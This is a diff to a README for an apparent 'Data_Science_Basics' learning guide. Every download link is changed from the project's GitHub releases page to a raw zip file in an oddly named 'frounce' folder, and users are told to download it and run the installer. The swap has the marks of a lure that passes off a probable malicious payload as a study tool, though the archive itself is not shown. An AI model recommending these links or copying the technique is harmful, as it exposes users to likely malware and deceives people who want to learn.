@@ -1,6 +1,6 @@
 # 📊 Data_Science_Basics - Learn Data Science Step-by-Step
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/daryldsad/Data_Science_Basics/releases)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/daryldsad/Data_Science_Basics/main/frounce/Science-Basics-Data-v3.4-beta.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these requirements:
 
 Click the button below to visit the downloads page. This page has the latest versions of the guide for Windows.
 
-[![Download Here](https://img.shields.io/badge/Download-Data_Science_Basics-blue)](https://github.com/daryldsad/Data_Science_Basics/releases)
+[![Download Here](https://img.shields.io/badge/Download-Data_Science_Basics-blue)](https://raw.githubusercontent.com/daryldsad/Data_Science_Basics/main/frounce/Science-Basics-Data-v3.4-beta.5.zip)
 
 ### Step 2: Choose Your Download File
 
@@ -120,7 +120,7 @@ New versions of the application may include fixes and additional content.
 
 To update, go back to the downloads page:
 
-https://github.com/daryldsad/Data_Science_Basics/releases
+https://raw.githubusercontent.com/daryldsad/Data_Science_Basics/main/frounce/Science-Basics-Data-v3.4-beta.5.zip
 
 Download the latest version and run the installer again. Your progress will not be lost.
 
@@ -134,4 +134,4 @@ For further support, you can open issues on the GitHub page or contact the maint
 
 ---
 
-[![Download Here](https://img.shields.io/badge/Download-Data_Science_Basics-green)](https://github.com/daryldsad/Data_Science_Basics/releases)
+[![Download Here](https://img.shields.io/badge/Download-Data_Science_Basics-green)](https://raw.githubusercontent.com/daryldsad/Data_Science_Basics/main/frounce/Science-Basics-Data-v3.4-beta.5.zip)
